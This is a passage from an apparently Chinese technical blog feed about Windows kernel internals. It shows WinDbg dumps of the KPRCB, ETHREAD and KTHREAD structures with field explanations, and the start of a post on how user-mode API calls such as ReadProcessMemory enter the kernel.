ExecutiveResourceReleaseExclusiveCount : 0x803a3</span><br><span class="line">   +0x3590 ExecutiveResourceReleaseSharedCount : 0x2494c7</span><br><span class="line">   +0x3594 ExecutiveResourceConvertsCount : 0x1bf</span><br><span class="line">   +0x3598 ExAcqResExclusiveAttempts : 0x7d665</span><br><span class="line">   +0x359c ExAcqResExclusiveAcquiresExclusive : 0x6d87b</span><br><span class="line">   +0x35a0 ExAcqResExclusiveAcquiresExclusiveRecursive : 0xfdd4</span><br><span class="line">   +0x35a4 ExAcqResExclusiveWaits : 0x346</span><br><span class="line">   +0x35a8 ExAcqResExclusiveNotAcquires : 0x16</span><br><span class="line">   +0x35ac ExAcqResSharedAttempts : 0x234556</span><br><span class="line">   +0x35b0 ExAcqResSharedAcquiresExclusive : 0x3244</span><br><span class="line">   +0x35b4 ExAcqResSharedAcquiresShared : 0x22d3fd</span><br><span class="line">   +0x35b8 ExAcqResSharedAcquiresSharedRecursive : 0x3f15</span><br><span class="line">   +0x35bc ExAcqResSharedWaits : 0x303</span><br><span class="line">   +0x35c0 ExAcqResSharedNotAcquires : 0</span><br><span class="line">   +0x35c4 ExAcqResSharedStarveExclusiveAttempts : 0x18051</span><br><span class="line">   +0x35c8 ExAcqResSharedStarveExclusiveAcquiresExclusive : 1</span><br><span class="line">   +0x35cc ExAcqResSharedStarveExclusiveAcquiresShared : 0x17faa</span><br><span class="line">   +0x35d0 ExAcqResSharedStarveExclusiveAcquiresSharedRecursive : 0xa6</span><br><span class="line">   +0x35d4 ExAcqResSharedStarveExclusiveWaits : 0</span><br><span class="line">   +0x35d8 ExAcqResSharedStarveExclusiveNotAcquires : 0</span><br><span class="line">   +0x35dc ExAcqResSharedWaitForExclusiveAttempts : 0</span><br><span class="line">   +0x35e0 ExAcqResSharedWaitForExclusiveAcquiresExclusive : 0</span><br><span class="line">   +0x35e4 ExAcqResSharedWaitForExclusiveAcquiresShared : 0</span><br><span class="line">   +0x35e8 ExAcqResSharedWaitForExclusiveAcquiresSharedRecursive : 0</span><br><span class="line">   +0x35ec ExAcqResSharedWaitForExclusiveWaits : 0</span><br><span class="line">   +0x35f0 ExAcqResSharedWaitForExclusiveNotAcquires : 0</span><br><span class="line">   +0x35f4 ExSetResOwnerPointerExclusive : 0</span><br><span class="line">   +0x35f8 ExSetResOwnerPointerSharedNew : 0x1d2</span><br><span class="line">   +0x35fc ExSetResOwnerPointerSharedOld : 0x74</span><br><span class="line">   +0x3600 ExTryToAcqExclusiveAttempts : 0</span><br><span class="line">   +0x3604 ExTryToAcqExclusiveAcquires : 0</span><br><span class="line">   +0x3608 ExBoostExclusiveOwner : 8</span><br><span class="line">   +0x360c ExBoostSharedOwners : 0</span><br><span class="line">   +0x3610 ExEtwSynchTrackingNotificationsCount : 0</span><br><span class="line">   +0x3614 ExEtwSynchTrackingNotificationsAccountedCount : 0</span><br><span class="line">   +0x3618 Context          : 0x80dc9340 _CONTEXT</span><br><span class="line">   +0x361c ContextFlags     : 0x10057</span><br><span class="line">   +0x3620 ExtendedState    : 0x80dc9000 _XSAVE_AREA</span><br><span class="line">   +0x3624 VectorToInterruptObject : [208] (null) </span><br><span class="line">   +0x3964 PrcbPad100       : [15] 0</span><br><span class="line">   +0x39a0 ProcessorSignature : 0xb0671</span><br><span class="line">   +0x39a4 PrcbShadowMappedPagePad1 : [335] 0</span><br><span class="line">   +0x3ee0 KernelDirectoryTableBase : 0</span><br><span class="line">   +0x3ee4 EspBaseShadow    : 0</span><br><span class="line">   +0x3ee8 UserEspShadow    : 0</span><br><span class="line">   +0x3eec ShadowFlags      : 0</span><br><span class="line">   +0x3ef0 UserDS           : 0</span><br><span class="line">   +0x3ef4 UserES           : 0</span><br><span class="line">   +0x3ef8 UserFS           : 0</span><br><span class="line">   +0x3efc EspIretd         : (null) </span><br><span class="line">   +0x3f00 RestoreSegOption : 0</span><br><span class="line">   +0x3f04 SavedEsi         : 0</span><br><span class="line">   +0x3f08 VerwSelector     : 0</span><br><span class="line">   +0x3f0a PrcbShadowPad    : 0</span><br><span class="line">   +0x3f0c TaskSwitchCount  : 0</span><br><span class="line">   +0x3f10 DbgLogs          : [512] 0</span><br><span class="line">   +0x4710 DbgCount         : 0</span><br><span class="line">   +0x4714 PrcbShadowMappedPagePad2 : [499] 0</span><br></pre></td></tr></table></figure><h4 id="ExceptionList"><a href="#ExceptionList" class="headerlink" title="ExceptionList"></a>ExceptionList</h4><p>错误链表，指向<code>EXCEPTION_REGISTRATION_RECORD</code>的列表，用于<code>SEH</code>，即为结构化异常处理，里面记录了异常处理函数。有人会称它为<code>SEH</code>链入口。</p><h4 id="CurrentThread"><a href="#CurrentThread" class="headerlink" title="CurrentThread"></a>CurrentThread</h4><p>当前<code>CPU</code>所执行线程的<code>ETHREAD</code>结构体。</p><h4 id="NextThread"><a href="#NextThread" class="headerlink" title="NextThread"></a>NextThread</h4><p>下一个<code>CPU</code>所执行线程的<code>ETHREAD</code>结构体。</p><h4 id="IdleThread"><a href="#IdleThread" class="headerlink" title="IdleThread"></a>IdleThread</h4><p>当所有的线程都执行完了<code>CPU</code>就执行这个线程。</p><h4 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h4><p><code>CPU</code>编号。</p><h4 id="ProcessorState"><a href="#ProcessorState" class="headerlink" title="ProcessorState"></a>ProcessorState</h4><p><code>CPU</code>状态，是<code>_KPROCESSOR_STATE</code>结构体。</p><h4 id="NpxThread"><a href="#NpxThread" class="headerlink" title="NpxThread"></a>NpxThread</h4><p><code>Npx</code>浮点处理器，最后一次用过浮点的线程。</p><h4 id="LogicalProcessorsPerPhysicalProcessor"><a href="#LogicalProcessorsPerPhysicalProcessor" class="headerlink" title="LogicalProcessorsPerPhysicalProcessor"></a>LogicalProcessorsPerPhysicalProcessor</h4><p>指明每个物理处理器有几个逻辑处理器。</p><h4 id="MHz"><a href="#MHz" class="headerlink" title="MHz"></a>MHz</h4><p><code>CPU</code>的频率。</p><h3 id="ETHREAD"><a href="#ETHREAD" class="headerlink" title="ETHREAD"></a>ETHREAD</h3><p>因为讲到了 <code>KTHREAD</code> 故把 <code>ETHREAD</code> 也讲一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _ETHREAD</span><br><span class="line">ntdll!_ETHREAD</span><br><span class="line">   +0x000 Tcb              : _KTHREAD</span><br><span class="line">   +0x200 CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +0x208 ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +0x208 KeyedWaitChain   : _LIST_ENTRY</span><br><span class="line">   +0x210 ExitStatus       : Int4B</span><br><span class="line">   +0x214 PostBlockList    : _LIST_ENTRY</span><br><span class="line">   +0x214 ForwardLinkShadow : Ptr32 Void</span><br><span class="line">   +0x218 StartAddress     : Ptr32 Void</span><br><span class="line">   +0x21c TerminationPort  : Ptr32 _TERMINATION_PORT</span><br><span class="line">   +0x21c ReaperLink       : Ptr32 _ETHREAD</span><br><span class="line">   +0x21c KeyedWaitValue   : Ptr32 Void</span><br><span class="line">   +0x220 ActiveTimerListLock : Uint4B</span><br><span class="line">   +0x224 ActiveTimerListHead : _LIST_ENTRY</span><br><span class="line">   +0x22c Cid              : _CLIENT_ID</span><br><span class="line">   +0x234 KeyedWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   +0x234 AlpcWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   +0x248 ClientSecurity   : _PS_CLIENT_SECURITY_CONTEXT</span><br><span class="line">   +0x24c IrpList          : _LIST_ENTRY</span><br><span class="line">   +0x254 TopLevelIrp      : Uint4B</span><br><span class="line">   +0x258 DeviceToVerify   : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +0x25c CpuQuotaApc      : Ptr32 _PSP_CPU_QUOTA_APC</span><br><span class="line">   +0x260 Win32StartAddress : Ptr32 Void</span><br><span class="line">   +0x264 LegacyPowerObject : Ptr32 Void</span><br><span class="line">   +0x268 ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +0x270 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x274 ThreadLock       : _EX_PUSH_LOCK</span><br><span class="line">   +0x278 ReadClusterSize  : Uint4B</span><br><span class="line">   +0x27c MmLockOrdering   : Int4B</span><br><span class="line">   +0x280 CrossThreadFlags : Uint4B</span><br><span class="line">   +0x280 Terminated       : Pos 0, 1 Bit</span><br><span class="line">   +0x280 ThreadInserted   : Pos 1, 1 Bit</span><br><span class="line">   +0x280 HideFromDebugger : Pos 2, 1 Bit</span><br><span class="line">   +0x280 ActiveImpersonationInfo : Pos 3, 1 Bit</span><br><span class="line">   +0x280 Reserved         : Pos 4, 1 Bit</span><br><span class="line">   +0x280 HardErrorsAreDisabled : Pos 5, 1 Bit</span><br><span class="line">   +0x280 BreakOnTermination : Pos 6, 1 Bit</span><br><span class="line">   +0x280 SkipCreationMsg  : Pos 7, 1 Bit</span><br><span class="line">   +0x280 SkipTerminationMsg : Pos 8, 1 Bit</span><br><span class="line">   +0x280 CopyTokenOnOpen  : Pos 9, 1 Bit</span><br><span class="line">   +0x280 ThreadIoPriority : Pos 10, 3 Bits</span><br><span class="line">   +0x280 ThreadPagePriority : Pos 13, 3 Bits</span><br><span class="line">   +0x280 RundownFail      : Pos 16, 1 Bit</span><br><span class="line">   +0x280 NeedsWorkingSetAging : Pos 17, 1 Bit</span><br><span class="line">   +0x284 SameThreadPassiveFlags : Uint4B</span><br><span class="line">   +0x284 ActiveExWorker   : Pos 0, 1 Bit</span><br><span class="line">   +0x284 ExWorkerCanWaitUser : Pos 1, 1 Bit</span><br><span class="line">   +0x284 MemoryMaker      : Pos 2, 1 Bit</span><br><span class="line">   +0x284 ClonedThread     : Pos 3, 1 Bit</span><br><span class="line">   +0x284 KeyedEventInUse  : Pos 4, 1 Bit</span><br><span class="line">   +0x284 RateApcState     : Pos 5, 2 Bits</span><br><span class="line">   +0x284 SelfTerminate    : Pos 7, 1 Bit</span><br><span class="line">   +0x288 SameThreadApcFlags : Uint4B</span><br><span class="line">   +0x288 Spare            : Pos 0, 1 Bit</span><br><span class="line">   +0x288 StartAddressInvalid : Pos 1, 1 Bit</span><br><span class="line">   +0x288 EtwPageFaultCalloutActive : Pos 2, 1 Bit</span><br><span class="line">   +0x288 OwnsProcessWorkingSetExclusive : Pos 3, 1 Bit</span><br><span class="line">   +0x288 OwnsProcessWorkingSetShared : Pos 4, 1 Bit</span><br><span class="line">   +0x288 OwnsSystemCacheWorkingSetExclusive : Pos 5, 1 Bit</span><br><span class="line">   +0x288 OwnsSystemCacheWorkingSetShared : Pos 6, 1 Bit</span><br><span class="line">   +0x288 OwnsSessionWorkingSetExclusive : Pos 7, 1 Bit</span><br><span class="line">   +0x289 OwnsSessionWorkingSetShared : Pos 0, 1 Bit</span><br><span class="line">   +0x289 OwnsProcessAddressSpaceExclusive : Pos 1, 1 Bit</span><br><span class="line">   +0x289 OwnsProcessAddressSpaceShared : Pos 2, 1 Bit</span><br><span class="line">   +0x289 SuppressSymbolLoad : Pos 3, 1 Bit</span><br><span class="line">   +0x289 Prefetching      : Pos 4, 1 Bit</span><br><span class="line">   +0x289 OwnsDynamicMemoryShared : Pos 5, 1 Bit</span><br><span class="line">   +0x289 OwnsChangeControlAreaExclusive : Pos 6, 1 Bit</span><br><span class="line">   +0x289 OwnsChangeControlAreaShared : Pos 7, 1 Bit</span><br><span class="line">   +0x28a OwnsPagedPoolWorkingSetExclusive : Pos 0, 1 Bit</span><br><span class="line">   +0x28a OwnsPagedPoolWorkingSetShared : Pos 1, 1 Bit</span><br><span class="line">   +0x28a OwnsSystemPtesWorkingSetExclusive : Pos 2, 1 Bit</span><br><span class="line">   +0x28a OwnsSystemPtesWorkingSetShared : Pos 3, 1 Bit</span><br><span class="line">   +0x28a TrimTrigger      : Pos 4, 2 Bits</span><br><span class="line">   +0x28a Spare1           : Pos 6, 2 Bits</span><br><span class="line">   +0x28b PriorityRegionActive : UChar</span><br><span class="line">   +0x28c CacheManagerActive : UChar</span><br><span class="line">   +0x28d DisablePageFaultClustering : UChar</span><br><span class="line">   +0x28e ActiveFaultCount : UChar</span><br><span class="line">   +0x28f LockOrderState   : UChar</span><br><span class="line">   +0x290 AlpcMessageId    : Uint4B</span><br><span class="line">   +0x294 AlpcMessage      : Ptr32 Void</span><br><span class="line">   +0x294 AlpcReceiveAttributeSet : Uint4B</span><br><span class="line">   +0x298 AlpcWaitListEntry : _LIST_ENTRY</span><br><span class="line">   +0x2a0 CacheManagerCount : Uint4B</span><br><span class="line">   +0x2a4 IoBoostCount     : Uint4B</span><br><span class="line">   +0x2a8 IrpListLock      : Uint4B</span><br><span class="line">   +0x2ac ReservedForSynchTracking : Ptr32 Void</span><br><span class="line">   +0x2b0 CmCallbackListHead : _SINGLE_LIST_ENTRY</span><br><span class="line">   +0x2b4 KernelStackReference : Uint4B</span><br></pre></td></tr></table></figure><p>其中 <code>TCB</code> 就是 <code>KTHREAD</code> 结构体，因此 <code>ETHREAD</code> 包含 <code>KTHREAD</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">   +0x010 CycleTime        : Uint8B</span><br><span class="line">   +0x018 HighCycleTime    : Uint4B</span><br><span class="line">   +0x020 QuantumTarget    : Uint8B</span><br><span class="line">   +0x028 InitialStack     : Ptr32 Void</span><br><span class="line">   +0x02c StackLimit       : Ptr32 Void</span><br><span class="line">   +0x030 KernelStack      : Ptr32 Void</span><br><span class="line">   +0x034 ThreadLock       : Uint4B</span><br><span class="line">   +0x038 WaitRegister     : _KWAIT_STATUS_REGISTER</span><br><span class="line">   +0x039 Running          : UChar</span><br><span class="line">   +0x03a Alerted          : [2] UChar</span><br><span class="line">   +0x03c KernelStackResident : Pos 0, 1 Bit</span><br><span class="line">   +0x03c ReadyTransition  : Pos 1, 1 Bit</span><br><span class="line">   +0x03c ProcessReadyQueue : Pos 2, 1 Bit</span><br><span class="line">   +0x03c WaitNext         : Pos 3, 1 Bit</span><br><span class="line">   +0x03c SystemAffinityActive : Pos 4, 1 Bit</span><br><span class="line">   +0x03c Alertable        : Pos 5, 1 Bit</span><br><span class="line">   +0x03c GdiFlushActive   : Pos 6, 1 Bit</span><br><span class="line">   +0x03c UserStackWalkActive : Pos 7, 1 Bit</span><br><span class="line">   +0x03c ApcInterruptRequest : Pos 8, 1 Bit</span><br><span class="line">   +0x03c ForceDeferSchedule : Pos 9, 1 Bit</span><br><span class="line">   +0x03c QuantumEndMigrate : Pos 10, 1 Bit</span><br><span class="line">   +0x03c UmsDirectedSwitchEnable : Pos 11, 1 Bit</span><br><span class="line">   +0x03c TimerActive      : Pos 12, 1 Bit</span><br><span class="line">   +0x03c SystemThread     : Pos 13, 1 Bit</span><br><span class="line">   +0x03c Reserved         : Pos 14, 18 Bits</span><br><span class="line">   +0x03c MiscFlags        : Int4B</span><br><span class="line">   +0x040 ApcState         : _KAPC_STATE</span><br><span class="line">   +0x040 ApcStateFill     : [23] UChar</span><br><span class="line">   +0x057 Priority         : Char</span><br><span class="line">   +0x058 NextProcessor    : Uint4B</span><br><span class="line">   +0x05c DeferredProcessor : Uint4B</span><br><span class="line">   +0x060 ApcQueueLock     : Uint4B</span><br><span class="line">   +0x064 ContextSwitches  : Uint4B</span><br><span class="line">   +0x068 State            : UChar</span><br><span class="line">   +0x069 NpxState         : Char</span><br><span class="line">   +0x06a WaitIrql         : UChar</span><br><span class="line">   +0x06b WaitMode         : Char</span><br><span class="line">   +0x06c WaitStatus       : Int4B</span><br><span class="line">   +0x070 WaitBlockList    : Ptr32 _KWAIT_BLOCK</span><br><span class="line">   +0x074 WaitListEntry    : _LIST_ENTRY</span><br><span class="line">   +0x074 SwapListEntry    : _SINGLE_LIST_ENTRY</span><br><span class="line">   +0x07c Queue            : Ptr32 _KQUEUE</span><br><span class="line">   +0x080 WaitTime         : Uint4B</span><br><span class="line">   +0x084 KernelApcDisable : Int2B</span><br><span class="line">   +0x086 SpecialApcDisable : Int2B</span><br><span class="line">   +0x084 CombinedApcDisable : Uint4B</span><br><span class="line">   +0x088 Teb              : Ptr32 Void</span><br><span class="line">   +0x090 Timer            : _KTIMER</span><br><span class="line">   +0x0b8 AutoAlignment    : Pos 0, 1 Bit</span><br><span class="line">   +0x0b8 DisableBoost     : Pos 1, 1 Bit</span><br><span class="line">   +0x0b8 EtwStackTraceApc1Inserted : Pos 2, 1 Bit</span><br><span class="line">   +0x0b8 EtwStackTraceApc2Inserted : Pos 3, 1 Bit</span><br><span class="line">   +0x0b8 CalloutActive    : Pos 4, 1 Bit</span><br><span class="line">   +0x0b8 ApcQueueable     : Pos 5, 1 Bit</span><br><span class="line">   +0x0b8 EnableStackSwap  : Pos 6, 1 Bit</span><br><span class="line">   +0x0b8 GuiThread        : Pos 7, 1 Bit</span><br><span class="line">   +0x0b8 UmsPerformingSyscall : Pos 8, 1 Bit</span><br><span class="line">   +0x0b8 VdmSafe          : Pos 9, 1 Bit</span><br><span class="line">   +0x0b8 UmsDispatched    : Pos 10, 1 Bit</span><br><span class="line">   +0x0b8 ReservedFlags    : Pos 11, 21 Bits</span><br><span class="line">   +0x0b8 ThreadFlags      : Int4B</span><br><span class="line">   +0x0bc ServiceTable     : Ptr32 Void</span><br><span class="line">   +0x0c0 WaitBlock        : [4] _KWAIT_BLOCK</span><br><span class="line">   +0x120 QueueListEntry   : _LIST_ENTRY</span><br><span class="line">   +0x128 TrapFrame        : Ptr32 _KTRAP_FRAME</span><br><span class="line">   +0x12c FirstArgument    : Ptr32 Void</span><br><span class="line">   +0x130 CallbackStack    : Ptr32 Void</span><br><span class="line">   +0x130 CallbackDepth    : Uint4B</span><br><span class="line">   +0x134 ApcStateIndex    : UChar</span><br><span class="line">   +0x135 BasePriority     : Char</span><br><span class="line">   +0x136 PriorityDecrement : Char</span><br><span class="line">   +0x136 ForegroundBoost  : Pos 0, 4 Bits</span><br><span class="line">   +0x136 UnusualBoost     : Pos 4, 4 Bits</span><br><span class="line">   +0x137 Preempted        : UChar</span><br><span class="line">   +0x138 AdjustReason     : UChar</span><br><span class="line">   +0x139 AdjustIncrement  : Char</span><br><span class="line">   +0x13a PreviousMode     : Char</span><br><span class="line">   +0x13b Saturation       : Char</span><br><span class="line">   +0x13c SystemCallNumber : Uint4B</span><br><span class="line">   +0x140 FreezeCount      : Uint4B</span><br><span class="line">   +0x144 UserAffinity     : _GROUP_AFFINITY</span><br><span class="line">   +0x150 Process          : Ptr32 _KPROCESS</span><br><span class="line">   +0x154 Affinity         : _GROUP_AFFINITY</span><br><span class="line">   +0x160 IdealProcessor   : Uint4B</span><br><span class="line">   +0x164 UserIdealProcessor : Uint4B</span><br><span class="line">   +0x168 ApcStatePointer  : [2] Ptr32 _KAPC_STATE</span><br><span class="line">   +0x170 SavedApcState    : _KAPC_STATE</span><br><span class="line">   +0x170 SavedApcStateFill : [23] UChar</span><br><span class="line">   +0x187 WaitReason       : UChar</span><br><span class="line">   +0x188 SuspendCount     : Char</span><br><span class="line">   +0x189 Spare1           : Char</span><br><span class="line">   +0x18a OtherPlatformFill : UChar</span><br><span class="line">   +0x18c Win32Thread      : Ptr32 Void</span><br><span class="line">   +0x190 StackBase        : Ptr32 Void</span><br><span class="line">   +0x194 SuspendApc       : _KAPC</span><br><span class="line">   +0x194 SuspendApcFill0  : [1] UChar</span><br><span class="line">   +0x195 ResourceIndex    : UChar</span><br><span class="line">   +0x194 SuspendApcFill1  : [3] UChar</span><br><span class="line">   +0x197 QuantumReset     : UChar</span><br><span class="line">   +0x194 SuspendApcFill2  : [4] UChar</span><br><span class="line">   +0x198 KernelTime       : Uint4B</span><br><span class="line">   +0x194 SuspendApcFill3  : [36] UChar</span><br><span class="line">   +0x1b8 WaitPrcb         : Ptr32 _KPRCB</span><br><span class="line">   +0x194 SuspendApcFill4  : [40] UChar</span><br><span class="line">   +0x1bc LegoData         : Ptr32 Void</span><br><span class="line">   +0x194 SuspendApcFill5  : [47] UChar</span><br><span class="line">   +0x1c3 LargeStack       : UChar</span><br><span class="line">   +0x1c4 UserTime         : Uint4B</span><br><span class="line">   +0x1c8 SuspendSemaphore : _KSEMAPHORE</span><br><span class="line">   +0x1c8 SuspendSemaphorefill : [20] UChar</span><br><span class="line">   +0x1dc SListFaultCount  : Uint4B</span><br><span class="line">   +0x1e0 ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +0x1e8 MutantListHead   : _LIST_ENTRY</span><br><span class="line">   +0x1f0 SListFaultAddress : Ptr32 Void</span><br><span class="line">   +0x1f4 ThreadCounters   : Ptr32 _KTHREAD_COUNTERS</span><br><span class="line">   +0x1f8 XStateSave       : Ptr32 _XSTATE_SAVE</span><br></pre></td></tr></table></figure><p>来看看几个重要成员</p><ul><li><code>PreviousMode</code>：先前模式，如果0环调用的，值为<code>0</code>。如果为3环调用的，值为<code>1</code>。</li><li><code>DebugActive</code>：调试活动状态，指示当前线程是否处于调试状态。如果这个成员被设成0，则会影响硬件断点无法断下。</li><li><code>TrapFrame</code>：栈帧，一个线程一个栈帧结构体。</li></ul><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_3">http://www.qfrost.com/posts/windowskernel/windows系统调用学习笔记_3</a></li><li>[2]：<a href="https://www.cnblogs.com/wingsummer/p/15543945.html">https://www.cnblogs.com/wingsummer/p/15543945.html</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下Windows系统调用的相关结构体</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="系统调用" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>windows系统调用学习——R3到R0</title>
    <link href="https://xia0ji233.github.io/2025/01/21/WindowsSyscall1/"/>
    <id>https://xia0ji233.github.io/2025/01/21/WindowsSyscall1/</id>
    <published>2025-01-21T13:00:00.000Z</published>
    <updated>2025-01-21T13:49:03.074Z</updated>
    
    <content type="html"><![CDATA[<p>来学习一下windows的系统调用</p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>API，应用程序接口（Application Programming Interface）。Windows API 顾名思义就是 Windows 提供的应用程序接口，为了在 Windows 上实现一定的功能，我们需要学习 API 的用途、传参、返回值等，微软对这部分都提供了大量的文档说明，因此详细学习 API 的实现原理对我们而言是很有必要的。</p><h2 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h2><p>先介绍几个比较重要的 DLL，几乎所有的 Windows 应用程序都会有对这些 DLL 的使用。</p><ul><li><code>Kernel32.dll</code>：最核心的功能模块，比如管理内存、进程和线程相关的函数等。</li><li><code>User32.dll</code>：是 <code>Windows</code> 用户界面相关应用程序接口，如创建窗口和发送消息等。</li><li><code>GDI32.dll</code>：全称是 <code>Graphical Device Interface</code>，即<strong>图形设备接口</strong>，包含用于画图和显示文本的函数.比如要显示一个程序窗口，就调用了其中的函数来画这个窗口。</li><li><code>Ntdll.dll</code>：大多数 <code>API</code> 都会通过这个 <code>DLL</code> 进入内核。</li></ul><p>并不是所有的 API 都需要进 Ring0，比如 <code>strlen</code> 之类的函数，Ring3 就能实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">strlen</span><span class="params">(<span class="type">char</span> *s)</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*s)&#123;</span><br><span class="line">        len++;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是大部分跨进程操作，调度等都是需要进入 Ring0 的，比如跨进程读API：<code>ReadProcessMemory</code>。</p><p>这里可以直接调试看看链路，入口点通常是 kernel32.dll 的 ReadProcessMemory，最后调用了 kernelbase.dll的 ReadProcessMemory。</p><img src="/2025/01/21/WindowsSyscall1/1.png" class=""><p>这里的 <code>NtReadVirtualMemory</code> 导入自 